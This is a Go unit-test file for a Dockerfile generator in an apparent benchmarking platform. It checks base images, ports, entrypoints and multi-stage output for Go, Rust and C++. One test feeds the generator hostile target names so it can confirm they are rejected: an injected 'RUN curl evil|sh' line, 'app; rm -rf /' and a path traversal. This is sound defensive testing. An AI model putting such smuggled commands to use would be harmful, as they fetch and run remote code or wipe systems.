// Package dockerfile defines tests for generate test.
//
// This file is part of the IICPC benchmarking platform and keeps its
// responsibilities local to the surrounding package. It should be read with
// the service-level design in design.md for broader operational context.
package dockerfile

import (
	"strings"
	"testing"
)

// TestGenerate_Go performs the package-specific operation described by its name.
// It keeps validation, side effects, and returned values within this package's contract.
func TestGenerate_Go(t *testing.T) {
	out, err := Generate("go", "go", "myapp", 9090)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	assertContains(t, out, "FROM golang:")
	assertContains(t, out, "FROM alpine:")
	assertContains(t, out, "/bin/myapp")
	assertContains(t, out, "EXPOSE 9090")
	assertContains(t, out, `ENTRYPOINT ["/app/myapp"]`)
	assertContains(t, out, "./src")
}

// TestGenerate_Rust performs the package-specific operation described by its name.
// It keeps validation, side effects, and returned values within this package's contract.
func TestGenerate_Rust(t *testing.T) {
	out, err := Generate("rust", "cargo", "trader", 8080)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	assertContains(t, out, "FROM rust:")
	assertContains(t, out, "FROM debian:")
	assertContains(t, out, "--bin trader")
	assertContains(t, out, "EXPOSE 8080")
	assertContains(t, out, `ENTRYPOINT ["/app/trader"]`)
	assertContains(t, out, "target/release/trader")
}

// TestGenerate_Cpp performs the package-specific operation described by its name.
// It keeps validation, side effects, and returned values within this package's contract.
func TestGenerate_Cpp(t *testing.T) {
	out, err := Generate("cpp", "cmake", "engine", 5000)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	assertContains(t, out, "FROM ubuntu:")
	assertContains(t, out, "--target engine")
	assertContains(t, out, "EXPOSE 5000")
	assertContains(t, out, `ENTRYPOINT ["/app/engine"]`)
	assertContains(t, out, "cmake")
}

// TestGenerate_TargetAppearsCorrectly performs the package-specific operation described by its name.
// It keeps validation, side effects, and returned values within this package's contract.
func TestGenerate_TargetAppearsCorrectly(t *testing.T) {
	cases := []struct {
		lang   string
		target string
	}{
		{"go", "my_algo"},
		{"rust", "my_algo"},
		{"cpp", "my_algo"},
	}
	for _, c := range cases {
		t.Run(c.lang+"/"+c.target, func(t *testing.T) {
			out, err := Generate(c.lang, "", c.target, 8080)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if !strings.Contains(out, c.target) {
				t.Errorf("target %q not found in output:\n%s", c.target, out)
			}
		})
	}
}

// TestGenerate_PortAppearsCorrectly performs the package-specific operation described by its name.
// It keeps validation, side effects, and returned values within this package's contract.
func TestGenerate_PortAppearsCorrectly(t *testing.T) {
	for _, lang := range []string{"go", "rust", "cpp"} {
		t.Run(lang, func(t *testing.T) {
			out, err := Generate(lang, "", "algo", 12345)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			assertContains(t, out, "EXPOSE 12345")
		})
	}
}

// TestGenerate_MultiStage performs the package-specific operation described by its name.
// It keeps validation, side effects, and returned values within this package's contract.
func TestGenerate_MultiStage(t *testing.T) {
	for _, lang := range []string{"go", "rust", "cpp"} {
		t.Run(lang, func(t *testing.T) {
			out, err := Generate(lang, "", "algo", 8080)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			fromCount := strings.Count(out, "\nFROM ")
			if strings.HasPrefix(out, "FROM ") {
				fromCount++
			}
			if fromCount < 2 {
				t.Errorf("lang %s: expected multi-stage (>=2 FROM), got %d", lang, fromCount)
			}
		})
	}
}

// TestGenerate_UnsupportedLanguage performs the package-specific operation described by its name.
// It keeps validation, side effects, and returned values within this package's contract.
func TestGenerate_UnsupportedLanguage(t *testing.T) {
	_, err := Generate("python", "pip", "app", 8080)
	if err == nil {
		t.Error("expected error for unsupported language, got nil")
	}
	if !strings.Contains(err.Error(), "python") {
		t.Errorf("error should mention the language, got: %v", err)
	}
}

// TestGenerate_EmptyLanguage performs the package-specific operation described by its name.
// It keeps validation, side effects, and returned values within this package's contract.
func TestGenerate_EmptyLanguage(t *testing.T) {
	_, err := Generate("", "", "app", 8080)
	if err == nil {
		t.Error("expected error for empty language, got nil")
	}
}

// TestGenerate_BuildTypeIgnored performs the package-specific operation described by its name.
// It keeps validation, side effects, and returned values within this package's contract.
func TestGenerate_BuildTypeIgnored(t *testing.T) {
	out1, err1 := Generate("go", "go", "algo", 8080)
	out2, err2 := Generate("go", "something_else", "algo", 8080)
	if err1 != nil || err2 != nil {
		t.Fatalf("unexpected errors: %v, %v", err1, err2)
	}
	if out1 != out2 {
		t.Error("buildType should be ignored but produced different output")
	}
}

// TestGenerate_RejectsInjectionTarget performs the package-specific operation described by its name.
// It keeps validation, side effects, and returned values within this package's contract.
func TestGenerate_RejectsInjectionTarget(t *testing.T) {
	for _, bad := range []string{"app\"\nRUN curl evil|sh", "app; rm -rf /", "../../x", "a b", ""} {
		if _, err := Generate("go", "go", bad, 9898); err == nil {
			t.Errorf("target %q accepted, want rejection", bad)
		}
	}
	if _, err := Generate("go", "go", "my-app_1", 9898); err != nil {
		t.Errorf("clean target rejected: %v", err)
	}
}

// assertContains performs the package-specific operation described by its name.
// It keeps validation, side effects, and returned values within this package's contract.
func assertContains(t *testing.T, haystack, needle string) {
	t.Helper()
	if !strings.Contains(haystack, needle) {
		t.Errorf("expected output to contain %q\nfull output:\n%s", needle, haystack)
	}
}
